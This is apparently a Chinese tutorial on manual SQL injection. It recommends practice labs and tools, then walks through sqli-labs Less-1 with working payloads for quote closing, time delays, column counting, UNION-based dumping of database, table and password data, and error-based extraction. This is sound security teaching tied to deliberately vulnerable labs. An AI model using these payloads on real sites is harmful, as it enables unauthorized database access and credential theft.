<p><code>&amp;&amp;</code>是<strong>逻辑与</strong> 即判断<code>&amp;&amp;</code>两侧的表达式是否都为真，都为真则此<code>&amp;&amp;</code>表达式值为真；</p>
<p><code>&amp;</code> 是<strong>按位与</strong> 即将<code>&amp;</code>两侧的数用二进制展开，每一位都求与运算(二进制与运算，跟逻辑与差不多)，最后得到的二进制数即为结果；逻辑与结果只讲真和假，而按位与得出的却是实实在在的一个数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1 -&gt; 01</span><br><span class="line">2 -&gt; 10</span><br><span class="line">     00</span><br><span class="line"></span><br><span class="line">1 -&gt; 01</span><br><span class="line">3 -&gt; 11</span><br><span class="line">     01</span><br></pre></td></tr></table></figure>
<h1 id="SQL-注入靶场"><a href="#SQL-注入靶场" class="headerlink" title="SQL 注入靶场"></a>SQL 注入靶场</h1><h2 id="sqli-labs"><a href="#sqli-labs" class="headerlink" title="sqli-labs"></a>sqli-labs</h2><p><strong>项目地址</strong>：<a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="noopener">https://github.com/Audi-1/sqli-labs</a></p>
<p>一个比较全的 SQL 注入靶场环境</p>
<h2 id="DVWA"><a href="#DVWA" class="headerlink" title="DVWA"></a>DVWA</h2><p>项目地址：<a href="https://github.com/ethicalhack3r/DVWA" target="_blank" rel="noopener">https://github.com/ethicalhack3r/DVWA</a></p>
<p>经典的综合漏洞靶场环境</p>
<h2 id="web-for-pentester"><a href="#web-for-pentester" class="headerlink" title="web for pentester"></a>web for pentester</h2><p>官网地址：<a href="https://pentesterlab.com/exercises/web_for_pentester/course" target="_blank" rel="noopener">https://pentesterlab.com/exercises/web_for_pentester/course</a></p>
<p>常见 Web 漏洞的靶场环境，ISO 文件挂载部署也比较方便</p>
<h1 id="SQL-注入工具"><a href="#SQL-注入工具" class="headerlink" title="SQL 注入工具"></a>SQL 注入工具</h1><h2 id="Hackbar"><a href="#Hackbar" class="headerlink" title="Hackbar"></a>Hackbar</h2><p><strong>手工注入必备工具</strong></p>
<p>修改了浮夸的界面，爱护眼睛才是第一.感谢r0oth3x49升级！By Darkmelody.</p>
<table>
<thead>
<tr>
<th style="text-align:left">文件名</th>
<th style="text-align:left">下载地址</th>
<th style="text-align:left">备用链接</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">hackbar.1.6.5.xpi</td>
<td style="text-align:left"><a href="https://sqlsec.lanzous.com/icgefjg" target="_blank" rel="noopener">蓝奏云</a></td>
<td style="text-align:left"><a href="https://sqlsec.lanzous.com/icgefjg" target="_blank" rel="noopener">蓝奏云</a></td>
</tr>
</tbody>
</table>
<p>自从用了这款Hackbar插件后，手工注入的速度大大提高了,通过<code>F9</code>开启和隐藏也十分地方便。</p>
<h2 id="Firefox-Dev"><a href="#Firefox-Dev" class="headerlink" title="Firefox Dev"></a>Firefox Dev</h2><p>经国光本人一个个测试，最终发现使用 Firefox 的 Dev 版本中的 56.0b9 版本可以完美地安装老版本的Hackbar 插件，安装过后，手工注入的速度嗖嗖的上涨，并且 Firefox 可以完美的导入 BP 的 SSL 证书，很方便我们后期使用 BurpSuite 抓取 HTTPS 网站。</p>
<table>
<thead>
<tr>
<th style="text-align:left">平台</th>
<th style="text-align:left">下载地址（官方）</th>
<th style="text-align:left">备用下载（Onedriver）</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">Windows64位</td>
<td style="text-align:left"><a href="https://download-origin.cdn.mozilla.net/pub/devedition/releases/56.0b9/win64/zh-CN/Firefox&gt; Setup 56.0b9.exe" target="_blank" rel="noopener">Firefox Setup 56.0b9.exe</a></td>
<td style="text-align:left"><a href="https://uijay-my.sharepoint.com/:u:/g/personal/aywtc_myoffice_fun/EWijRJ0ht9JGpq6hgLf1p_wB4KiTII4dO13zJoscBJumPg?e=42yHMf" target="_blank" rel="noopener">Firefox Setup 56.0b9.exe</a></td>
</tr>
<tr>
<td style="text-align:left">Windows32位</td>
<td style="text-align:left"><a href="https://download-origin.cdn.mozilla.net/pub/devedition/releases/56.0b9/win32/zh-CN/Firefox&gt; Setup 56.0b9.exe" target="_blank" rel="noopener">Firefox Setup 56.0b9.exe</a></td>
<td style="text-align:left">32位 国光比较懒 不提供备用下载</td>
</tr>
<tr>
<td style="text-align:left">Linux x86_64</td>
<td style="text-align:left"><a href="https://download-origin.cdn.mozilla.net/pub/devedition/releases/56.0b9/linux-x86_64/zh-CN/firefox-56.0b9.tar.bz2" target="_blank" rel="noopener">firefox-56.0b9.tar.bz2</a></td>
<td style="text-align:left"><a href="https://uijay-my.sharepoint.com/:u:/g/personal/aywtc_myoffice_fun/EXsb9L6QavpDhXr_neUtAJwBEl_70ztxfa3FJULklgmXjg?e=KhQIlL" target="_blank" rel="noopener">firefox-56.0b9.tar.bz2</a></td>
</tr>
<tr>
<td style="text-align:left">macOS</td>
<td style="text-align:left"><a href="https://download-origin.cdn.mozilla.net/pub/devedition/releases/56.0b9/mac/zh-CN/Firefox&gt; 56.0b9.dmg" target="_blank" rel="noopener">Firefox 56.0b9.dmg</a></td>
<td style="text-align:left"><a href="https://uijay-my.sharepoint.com/:u:/g/personal/aywtc_myoffice_fun/EfirSMz2pNxNsD6QqiNVzksBHvhlo8Tza1GbE13D0CthPQ?e=aP6UiN" target="_blank" rel="noopener">Firefox 56.0b9.dmg</a></td>
</tr>
</tbody>
</table>
<p><strong>关闭自动更新</strong></p>
<p>首先下载完启动<code>Firefox Developer Edition</code>一定要<strong>断网！断网！断网！</strong>因为火狐的策略问题，默认会自动更新，联网安装的话，刚刚安装完的时候就会被强制更新最新版本了，所以断网安装大法保平安。安装完成后，设置里面勾选<code>不检查更新</code>。然后就可以恢复联网了</p>
<p><strong>允许第三方插件</strong></p>
<p>火狐安全策略的原因是无法顺利安装一些第三方插件的，得手动去高级选项里面关闭一下，浏览器打开：</p>
<p><a href="about:config" target="_blank" rel="noopener">about:config</a></p>
<p>点击<code>我了解此风险</code>：</p>
<p><img src="https://dn-coding-net-tweet.codehub.cn/photo/2019/e13f866e-3f89-4cb8-b8f8-962814555b20.jpg" alt="img"></p>
<p>鼠标下滑，找到倒数第3和第4个选项，即<code>xpinstall.signatures.required</code>和<code>xpinstall.whitelist.required</code>，将值切换为<code>false</code>：</p>
<p><img src="https://dn-coding-net-tweet.codehub.cn/photo/2019/8a6db6e0-e26d-496f-b939-fab5711ca81a.jpg" alt="img"></p>
<p>然后就可以愉快地安装一些第三方插件了</p>
<h2 id="SQLMap"><a href="#SQLMap" class="headerlink" title="SQLMap"></a>SQLMap</h2><p>自动化注入必备神器</p>
<p><strong>项目地址</strong>：<a href="https://github.com/sqlmapproject/sqlmap" target="_blank" rel="noopener">https://github.com/sqlmapproject/sqlmap</a></p>
<p>在实战中基本上都是靠 SQLMap 因为纯手工盲注得注入到天荒地老 手工注入只是加深对注入的原理的理解</p>
<h1 id="UNION-联合查询注入"><a href="#UNION-联合查询注入" class="headerlink" title="UNION 联合查询注入"></a>UNION 联合查询注入</h1><h2 id="SQLi-Labs-Less1"><a href="#SQLi-Labs-Less1" class="headerlink" title="SQLi-Labs Less1"></a>SQLi-Labs Less1</h2><p>Less1 是一个非常经典的 SQL的注入漏洞类型，这里就来演示讲解一下手工注入的流程。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">// take the variables</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">$id=$_GET[<span class="string">'id'</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// connectivity</span></span><br><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line"><span class="comment">// 输出所有查询的数据，从结果集中取得一行作为关联数组 如果没有更多行则返回 false</span></span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($row)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"&lt;font size='5' color= '#99FF00'&gt;"</span>;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">'Your Login name:'</span>. $row[<span class="string">'username'</span>];</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">'Your Password:'</span> .$row[<span class="string">'password'</span>];</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;font color= "#FFFF00"&gt;'</span>;</span><br><span class="line">    print_r(mysql_error());</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;  </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">else</span> &#123; <span class="keyword">echo</span> <span class="string">"Please input the ID as parameter with numeric value"</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="推测SQL语句"><a href="#推测SQL语句" class="headerlink" title="推测SQL语句"></a>推测SQL语句</h2><p>尝试构造payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/Less-1/?id=1&apos;</span><br></pre></td></tr></table></figure>
<p>这样MySQL语句就变成了这样了：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE id=&apos;1&apos;&apos; LIMIT 0,1</span><br></pre></td></tr></table></figure>
<p>所以我们会看到这样的提示：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">on for the right syntax to use near &apos;&apos;1&apos;&apos; LIMIT 0,1&apos; at line 1</span><br><span class="line"></span><br><span class="line">&apos;&apos;1&apos;&apos; LIMIT 0,1&apos;</span><br><span class="line"></span><br><span class="line">&apos;1&apos;&apos; LIMIT 0,1</span><br><span class="line"></span><br><span class="line">1&apos;</span><br></pre></td></tr></table></figure>
<p>反推测出代码中的 SQL 语句：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">tables</span> <span class="keyword">where</span> <span class="keyword">id</span> =<span class="string">''</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>
<h2 id="闭合注入"><a href="#闭合注入" class="headerlink" title="闭合注入"></a>闭合注入</h2><p>我们前面输入的 引号<code>&#39;</code>被闭合了，但是没有闭合后面的引号，导致后面的引号报错了，尝试闭合试试看：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/Less-1/?id=1' and '1'='1</span><br></pre></td></tr></table></figure>
<p>这样MySQL语句就变成了这样了：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">tables</span> <span class="keyword">where</span> <span class="keyword">id</span> =<span class="string">'1'</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">tables</span> <span class="keyword">where</span> <span class="keyword">id</span> =<span class="string">'1'</span> <span class="keyword">and</span> <span class="string">'1'</span>=<span class="string">'1'</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>此时完美毕业，页面应该是正常响应的。</p>
<h2 id="注释注入"><a href="#注释注入" class="headerlink" title="注释注入"></a>注释注入</h2><p>因为使用<code>GET</code>传递值的时候，浏览器会自动帮我们进行 URL 解码，所以经常如下使用：</p>
<p>构造一个报错的页面：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">and 1=1 %23</span><br><span class="line">and 1=2 %23</span><br><span class="line">and 1=1 <span class="comment">--+</span></span><br><span class="line">and 1=2 <span class="comment">--+</span></span><br><span class="line"></span><br><span class="line">' and 1=1 %23</span><br><span class="line">' and 1=2 %23</span><br><span class="line">' and 1=1 <span class="comment">--+</span></span><br><span class="line">' and 1=2 <span class="comment">--+</span></span><br><span class="line"></span><br><span class="line">" and 1=1 %23</span><br><span class="line">" and 1=2 %23</span><br><span class="line">" and 1=1 <span class="comment">--+</span></span><br><span class="line">" and 1=2 <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
<p>构造一个延时：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">' and sleep(10) %23</span><br><span class="line">' and sleep(10) <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
<p>所以在 <code>POST</code> 注入的时候 我们常直接使用 <code>#</code> 来注释语句</p>
<h2 id="判断字段数目"><a href="#判断字段数目" class="headerlink" title="判断字段数目"></a>判断字段数目</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id=1’ order by 1 --+ 此时页面正常，继续换更大的数字测试</span><br><span class="line">?id=1’ order by 10--+ 此时页面返回错误，更换小的数字测试</span><br><span class="line">?id=1’ order by 5 --+ 此时页面依然报错，继续缩小数值测试</span><br><span class="line">?id=1’ order by 3 --+ 此时页面返回正常，更换大的数字测试</span><br><span class="line">?id=1’ order by 4 --+ 此时页面返回错误，3正常，4错误，说明字段数目就是 3</span><br></pre></td></tr></table></figure>
<p>数学里面的二分对半查找，用以确定字段数目。</p>
<h2 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h2><p><code>UNION SELECT</code> 联合查询，手工注入经典语句，作用是在后面通过<code>UNION</code>把我们的恶意注入语句接上去，带入数据库进行查询。 因为字段数目是:<code>3</code>,那么正规的语句如下:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; UNION SELECT 1,2,3 --+</span><br></pre></td></tr></table></figure>
<p>这里页面是不会报错的，此时我们带入数据库的语句为:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT * FROM users WHERE id=&apos;1&apos; UNION SELECT 1,2,3;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | Dumb     | Dumb     |</span><br><span class="line">|  1 | 2        | 3        |</span><br><span class="line">+----+----------+----------+</span><br></pre></td></tr></table></figure>
<p><img src="http://10.11.30.89:4000/%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E5%AE%8C%E6%95%B4%E6%B5%81%E7%A8%8B/imgs/1555994572407.png" alt="1555994572407"></p>
<p>使用and语句故意构造报错：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE id=&apos;1&apos; and 1=2 union select 1,2,3 --+&apos; LIMIT 0,1</span><br></pre></td></tr></table></figure>
<p>使用利用数据本身构造报错：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE id=&apos;-1&apos; union select 1,2,3 --+&apos; LIMIT 0,1</span><br></pre></td></tr></table></figure>
<p><img src="http://10.11.30.89:4000/%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E5%AE%8C%E6%95%B4%E6%B5%81%E7%A8%8B/imgs/image-20200510151630128.png" alt="image-20200510151630128"></p>
<p>来看下数据库的语句情况：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT * FROM users WHERE id=<span class="string">'-1'</span> UNION SELECT 1,2,3;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | 2        | 3        |</span><br><span class="line">+----+----------+----------+</span><br></pre></td></tr></table></figure>
<p>其字段内容可以在页面显示，不一定要用union select 1,2,3形式</p>
<h2 id="基本信息收集"><a href="#基本信息收集" class="headerlink" title="基本信息收集"></a>基本信息收集</h2><p>在对应字段放入要查询的函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 查询数据库版本和用户信息</span><br><span class="line">and 1=2 union select 1,version(),user() --+</span><br><span class="line"></span><br><span class="line"># 查询当前数据库和系统版本</span><br><span class="line">and 1=2 union select 1,database(),@@version_compile_os --+</span><br></pre></td></tr></table></figure>
<h2 id="课堂思考问题"><a href="#课堂思考问题" class="headerlink" title="课堂思考问题"></a>课堂思考问题</h2><ul>
<li>为什么 order by 可以判断字段数？</li>
<li>为什么先判断字段数才可再使用 union 联合查询？</li>
<li>为什么联合查询不配合报错看不到回显信息？</li>
<li>为什么联合查询爆出的字段可以用来利用？非要用 union select 1,2,3 形式吗？</li>
</ul>
<h2 id="查询所有数据库"><a href="#查询所有数据库" class="headerlink" title="查询所有数据库"></a>查询所有数据库</h2><blockquote>
<p>需要注意插入位置 中间字段的话 需要手动分开语句</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">group_concat(schema_name) from information_schema.schemata</span><br><span class="line"></span><br><span class="line">group_concat(schema_name separator 0x3c62723e) from information_schema.schemata;</span><br><span class="line"></span><br><span class="line">group_concat(schema_name separator &apos;&lt;br&gt;&apos;) from information_schema.schemata;</span><br><span class="line"></span><br><span class="line">group_concat(schema_name separator &apos;:&apos;) from information_schema.schemata;</span><br></pre></td></tr></table></figure>
<p>手动去数据库的表里查看下数据。</p>
<p>information_schema 数据库下的 <code>schemata</code>表中的<code>schema_name</code>记录的是各个<code>数据库</code>的名称:</p>
<p><img src="http://10.11.30.89:4000/%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E5%AE%8C%E6%95%B4%E6%B5%81%E7%A8%8B/imgs/1555996943051.png" alt="1555996943051"></p>
<h2 id="查看当前数据库表名"><a href="#查看当前数据库表名" class="headerlink" title="查看当前数据库表名"></a>查看当前数据库表名</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">group_concat(table_name) from information_schema.tables where table_schema=database()</span><br></pre></td></tr></table></figure>
<p><code>tables</code>表中的<code>table_name</code>列记录了所有的<strong>表名</strong></p>
<p><code>tables</code>表中的<code>table_schema</code>列记录了所有的<strong>数据库名</strong></p>
<p><img src="http://10.11.30.89:4000/%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E5%AE%8C%E6%95%B4%E6%B5%81%E7%A8%8B/imgs/1555997320108.png" alt="1555997320108"></p>
<h2 id="查看其他数据库表名"><a href="#查看其他数据库表名" class="headerlink" title="查看其他数据库表名"></a>查看其他数据库表名</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 用引号</span><br><span class="line">group_concat(table_name) from information_schema.tables where table_schema=&apos;数据库名&apos;</span><br><span class="line"></span><br><span class="line"># hex编码</span><br><span class="line">group_concat(table_name) from information_schema.tables where table_schema=0x776F6F79756E</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">group_concat(table_name) from information_schema.tables where table_schema=unhex(7365637572697479)</span><br></pre></td></tr></table></figure>
<h2 id="查询当前数据库下的-users-表的列名"><a href="#查询当前数据库下的-users-表的列名" class="headerlink" title="查询当前数据库下的 users 表的列名"></a>查询当前数据库下的 users 表的列名</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">group_concat(column_name) from information_schema.columns where table_name=&apos;users&apos;</span><br></pre></td></tr></table></figure>
<h2 id="查询其他数据库下表的列名"><a href="#查询其他数据库下表的列名" class="headerlink" title="查询其他数据库下表的列名"></a>查询其他数据库下表的列名</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">group_concat(column_name) from information_schema.columns where table_schema=&apos;数据库名&apos; and table_name=&apos;表名&apos;;</span><br></pre></td></tr></table></figure>
<h2 id="查询当前库下的字段值"><a href="#查询当前库下的字段值" class="headerlink" title="查询当前库下的字段值"></a>查询当前库下的字段值</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">group_concat(id,username,password) from users</span><br></pre></td></tr></table></figure>
<h2 id="查询其他库下的字段值"><a href="#查询其他库下的字段值" class="headerlink" title="查询其他库下的字段值"></a>查询其他库下的字段值</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">group_concat(字段名) from 数据库名.表名</span><br></pre></td></tr></table></figure>
<h1 id="Hackbar-半自动化注入"><a href="#Hackbar-半自动化注入" class="headerlink" title="Hackbar 半自动化注入"></a>Hackbar 半自动化注入</h1><p>回到刚刚的 Less 1 ，下面全程尝试使用 Hackbar 来进行手工注入查询：</p>
<h2 id="查询所有的数据库名"><a href="#查询所有的数据库名" class="headerlink" title="查询所有的数据库名"></a>查询所有的数据库名</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">SELECT</span>+<span class="keyword">GROUP_CONCAT</span>(schema_name+SEPARATOR+<span class="number">0x3c62723e</span>)+<span class="keyword">FROM</span>+INFORMATION_SCHEMA.SCHEMATA),<span class="number">3</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
<h2 id="查询当前数据库的表名"><a href="#查询当前数据库的表名" class="headerlink" title="查询当前数据库的表名"></a>查询当前数据库的表名</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">SELECT</span>+<span class="keyword">GROUP_CONCAT</span>(table_name+SEPARATOR+<span class="number">0x3c62723e</span>)+<span class="keyword">FROM</span>+INFORMATION_SCHEMA.TABLES+<span class="keyword">WHERE</span>+TABLE_SCHEMA=<span class="keyword">DATABASE</span>()),<span class="number">3</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
<h2 id="查询-users-表的列名"><a href="#查询-users-表的列名" class="headerlink" title="查询 users 表的列名"></a>查询 users 表的列名</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">SELECT</span>+<span class="keyword">GROUP_CONCAT</span>(column_name+SEPARATOR+<span class="number">0x3c62723e</span>)+<span class="keyword">FROM</span>+INFORMATION_SCHEMA.COLUMNS+<span class="keyword">WHERE</span>+TABLE_NAME=<span class="number">0x7573657273</span>),<span class="number">3</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
<h2 id="查询-username-password-的字段值"><a href="#查询-username-password-的字段值" class="headerlink" title="查询 username,password 的字段值"></a>查询 username,password 的字段值</h2><p>最后一步 也就是 dump 数据</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">SELECT</span>+<span class="keyword">GROUP_CONCAT</span>(username,<span class="keyword">password</span>+SEPARATOR+<span class="number">0x3c62723e</span>)+<span class="keyword">FROM</span>+<span class="keyword">users</span>),<span class="number">3</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
<h2 id="查询其他数据库的表名"><a href="#查询其他数据库的表名" class="headerlink" title="查询其他数据库的表名"></a>查询其他数据库的表名</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">SELECT</span>+<span class="keyword">GROUP_CONCAT</span>(table_name+SEPARATOR+<span class="number">0x3c62723e</span>)+<span class="keyword">FROM</span>+INFORMATION_SCHEMA.TABLES+<span class="keyword">WHERE</span>+TABLE_SCHEMA=<span class="number">0x6368616c6c656e676573</span>),<span class="number">3</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
<p>查询出的表名为：<strong>1j9hvmml6l</strong></p>
<h2 id="查询其他数据库的表名下的列名"><a href="#查询其他数据库的表名下的列名" class="headerlink" title="查询其他数据库的表名下的列名"></a>查询其他数据库的表名下的列名</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">SELECT</span>+<span class="keyword">GROUP_CONCAT</span>(column_name+SEPARATOR+<span class="number">0x3c62723e</span>)+<span class="keyword">FROM</span>+INFORMATION_SCHEMA.COLUMNS+<span class="keyword">WHERE</span>+TABLE_NAME=<span class="number">0x316a3968766d6d6c366c</span>+<span class="keyword">and</span>+table_schema=<span class="string">'challenges'</span>),<span class="number">3</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
<h1 id="基于报错的注入"><a href="#基于报错的注入" class="headerlink" title="基于报错的注入"></a>基于报错的注入</h1><p>报错注入利用条件是<strong>网站开启了 SQL 报错日志功能</strong>，否则无法使用报错注入，具有一定的局限性。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql_error()</span><br></pre></td></tr></table></figure>
<p>一是需要 concat 计数，二是 floor，取得 0 or 1，进行数据的 重复，三是 group by 进行分组</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2)) a from information_schema.columns group by a;</span><br></pre></td></tr></table></figure>
<p>利用了 MySQL 的第 8652 号 Bug ：Bug #8652 group by part of rand() returns duplicate key error 来进行的盲注，使得 MySQL 由于函数的特性返回错误信息，进而我们可以显示我们想要的信息，从而达到注入的效果</p>
<blockquote>
<p>报错注入因为日志报错问题只能报一行</p>
</blockquote>
<h2 id="xpath-语法错误"><a href="#xpath-语法错误" class="headerlink" title="xpath 语法错误"></a>xpath 语法错误</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select extractvalue(1,concat(0x7e,(select @@version),0x7e));</span><br><span class="line"></span><br><span class="line">select updatexml(1,concat(0x7e,(select @@version),0x7e),1);</span><br></pre></td></tr></table></figure>
<h2 id="重复特性"><a href="#重复特性" class="headerlink" title="重复特性"></a>重复特性</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x;</span><br></pre></td></tr></table></figure>
